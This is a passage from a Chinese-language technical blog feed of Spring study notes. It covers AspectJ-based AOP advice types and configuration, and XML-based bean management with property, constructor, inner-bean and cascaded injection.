<span class="token operator">=</span> <span class="token string">"pointCut()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 后置通知（返回通知）     */</span>    <span class="token annotation punctuation">@AfterReturning</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterReturning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterReturning..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 异常通知     */</span>    <span class="token annotation punctuation">@AfterThrowing</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterThrowing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterThrowing..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     *最终通知     */</span>    <span class="token annotation punctuation">@After</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 环绕通知     */</span>    <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">around</span><span class="token punctuation">(</span>ProceedingJoinPoint proceedingJoinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕之前..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 被增强的方法执行</span>        proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕之后..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>aop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/aop<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd                        http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 开启注解扫描 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 开启Aspect生成代理对象--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>aspectj-autoproxy</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>aspectj-autoproxy</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><pre><code>环绕之前...before...add......环绕之后...after...afterReturning...</code></pre><p>（3）有多个增强类多同一个方法进行增强，设置增强类优先级<br> 在增强类上面添加注解 @Order(数字类型值)，数字类型值越小优先级越高</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span><span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PersonProxy</span> </code></pre><p>（4）完全使用注解开发<br> 创建配置类，不需要创建 xml 配置文件</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>basePackages <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"com.micah"</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token annotation punctuation">@EnableAspectJAutoProxy</span><span class="token punctuation">(</span>proxyTargetClass <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//开启Aspect生成代理对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigAop</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> </code></pre><h4 id="3、Aspect配置文件"><a href="#3、Aspect配置文件" class="headerlink" title="3、Aspect配置文件"></a>3、Aspect配置文件</h4><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--创建对象--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>book<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.aopxml.Book<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bookProxy<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.aopxml.BookProxy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--配置 aop 增强--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--切入点--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>pointcut</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>p<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>execution(*com.micah.spring.aopxml.Book.buy(..))<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!--配置切面--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>aspect</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bookProxy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--增强作用在具体的方法上--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>before</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>before<span class="token punctuation">"</span></span> <span class="token attr-name">pointcut-ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>p<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>aspect</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring bean</title>
      <link href="/2021/02/20/spring-bean/"/>
      <url>/2021/02/20/spring-bean/</url>
      
        <content type="html"><![CDATA[<h3 id="一、概念与定义"><a href="#一、概念与定义" class="headerlink" title="一、概念与定义"></a>一、概念与定义</h3><h4 id="1、什么是Spring-beans"><a href="#1、什么是Spring-beans" class="headerlink" title="1、什么是Spring beans?"></a>1、什么是Spring beans?</h4><p>Bean: 在Spring中，构成应用程序主干并由Spring IoC容器管理的对象称为bean。Bean是由Spring IoC容器实例化，组装和以其他方式管理的对象。否则，bean仅仅是应用程序中许多对象之一。Bean及其之间的依赖关系反映在容器使用的配置元数据中。</p><pre><code>Spring Beans是构成Spring应用核心的Java对象。这些对象由Spring IoC容器实例化、组装、管理。这些对象通过容器中配置的元数据创建，例如，使用XML文件中定义的创建。在Spring中创建的beans都是单例的beans。在bean标签中有一个属性为”singleton”, 如果设为true，该bean是单例的，如果设为false，该bean是原型bean。Singleton属性默认设置为true。因此，spring框架中所有的bean都默认为单例bean。</code></pre><h4 id="2、-一个-Spring-Bean-定义包含什么？"><a href="#2、-一个-Spring-Bean-定义包含什么？" class="headerlink" title="2、 一个 Spring Bean 定义包含什么？"></a>2、 一个 Spring Bean 定义包含什么？</h4><p>一个Spring Bean 的定义包含容器必知的所有配置元数据，包括如何创建一个bean，它的生命周期详情及它的依赖。</p><h4 id="3、如何给Spring-容器提供配置元数据"><a href="#3、如何给Spring-容器提供配置元数据" class="headerlink" title="3、如何给Spring 容器提供配置元数据?"></a>3、如何给Spring 容器提供配置元数据?</h4><p>这里有三种重要的方法给Spring 容器提供配置元数据。</p><p>（1）XML配置文件。<br> （2）基于注解的配置。<br> （3）<a href="https://docs.spring.io/spring-framework/docs/5.0.6.RELEASE/spring-framework-reference/core.html#beans-java" target="_blank" rel="noopener">基于Java的配置</a></p><h3 id="二、基于xml方式管理Bean"><a href="#二、基于xml方式管理Bean" class="headerlink" title="二、基于xml方式管理Bean"></a>二、基于xml方式管理Bean</h3><h4 id="1、使用xml配置注入属性，set方式注入属性，有参构造方法注入（创建对象时候，默认也是执行无参数构造方法完成对象创建）"><a href="#1、使用xml配置注入属性，set方式注入属性，有参构造方法注入（创建对象时候，默认也是执行无参数构造方法完成对象创建）" class="headerlink" title="1、使用xml配置注入属性，set方式注入属性，有参构造方法注入（创建对象时候，默认也是执行无参数构造方法完成对象创建）"></a>1、使用xml配置注入属性，set方式注入属性，有参构造方法注入（创建对象时候，默认也是执行无参数构造方法完成对象创建）</h4><pre class=" language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!--配置Book对象创建,并注入属性        id属性：唯一标识        class属性：类全路径（包类路径）         set方法注入属性--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>book<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.Book<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token comment" spellcheck="true">&lt;!--使用Property来进行属性注入--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上海...研究所<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bauthor<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Micah<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--有参构造方法注入属性--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orders<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.Orders<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>haha<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hahhahahahha<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h4 id="2、使用P名称空间注入（了解）"><a href="#2、使用P名称空间注入（了解）" class="headerlink" title="2、使用P名称空间注入（了解）"></a>2、使用P名称空间注入（了解）</h4><p>使用 p 名称空间注入，可以简化基于 xml 配置方式</p><p>第一步 添加 p 名称空间在配置文件中</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>p</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/p<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>第二步 进行属性注入，在 bean 标签里面进行操作</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--2 set 方法注入属性--></span>&lt;bean id="book" class="com.atguigu.spring5.Book" p:bname="九阳神功"p:bauthor="无名氏"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h4 id="3、注入一些特殊类型的属性"><a href="#3、注入一些特殊类型的属性" class="headerlink" title="3、注入一些特殊类型的属性"></a>3、注入一些特殊类型的属性</h4><p>（1）字面量</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--null 值--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>address<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>null</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span></code></pre><p>（2）属性值包含特殊符号</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--属性值包含特殊符号         1 把&lt;>进行转义 &amp;lt; &amp;gt;         2 把带特殊符号内容写到CDATA         --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>address<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[&lt;&lt;南京>>]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span></code></pre><h4 id="4、注入外部Bean"><a href="#4、注入外部Bean" class="headerlink" title="4、注入外部Bean"></a>4、注入外部Bean</h4><p>（1）创建两个类 service 类和 dao 类 </p><p>（2）在 service 调用 dao 里面的方法 </p><p>（3）在 spring 配置文件中进行配置</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 创建UserDao的对象，并设置set()方法</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUserDao</span><span class="token punctuation">(</span>UserDao userDao<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>userDao <span class="token operator">=</span> userDao<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service add..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1、原始方式：创建UserDao对象</span>        <span class="token comment" spellcheck="true">/*UserDao userDao = new UserDaoImpl();        userDao.update(); */</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>​        (4)在 spring配置文件中进行配置</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--1 service和dao的创建--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.service.UserService<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--注入UserDao的对象            name:属性值，类里面属性名称            ref:属性值，创建UserDao对象bean标签ID值        --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.dao.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><h4 id="5、注入内部Bean属性"><a href="#5、注入内部Bean属性" class="headerlink" title="5、注入内部Bean属性"></a>5、注入内部Bean属性</h4><p>（1）一对多关系：部门和员工 一个部门有多个员工，一个员工属于一个部门 部门是一，员工是多 </p><p>（2）在实体类之间表示一对多关系，员工表示所属部门，使用对象类型属性进行表示</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Department</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String dname<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDname</span><span class="token punctuation">(</span>String dname<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dname <span class="token operator">=</span> dname<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Emp</span> <span class="token punctuation">{</span><span class="token keyword">private</span> String ename<span class="token punctuation">;</span><span class="token keyword">private</span> String gender<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//员工属于某一个部门，使用对象形式表示</span><span class="token keyword">private</span> Dept dept<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDept</span><span class="token punctuation">(</span>Dept dept<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>dept <span class="token operator">=</span> dept<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setEname</span><span class="token punctuation">(</span>String ename<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>ename <span class="token operator">=</span> ename<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setGender</span><span class="token punctuation">(</span>String gender<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>gender <span class="token operator">=</span> gender<span class="token punctuation">;</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--内部 bean--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>emp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.bean.Emp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--设置两个普通属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ename<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lucy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>女<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--设置对象类型属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dept<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dept<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.bean.Dept<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>安保部<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h4 id="6、注入属性-级联赋值"><a href="#6、注入属性-级联赋值" class="headerlink" title="6、注入属性-级联赋值"></a>6、注入属性-级联赋值</h4><p>（1）第一种写法</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>employee<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.bean.Employee<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--普通属性--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Micah<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>男<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token comment" spellcheck="true">&lt;!--设置对象属性--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>department<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>department<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring.bean.Department<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token 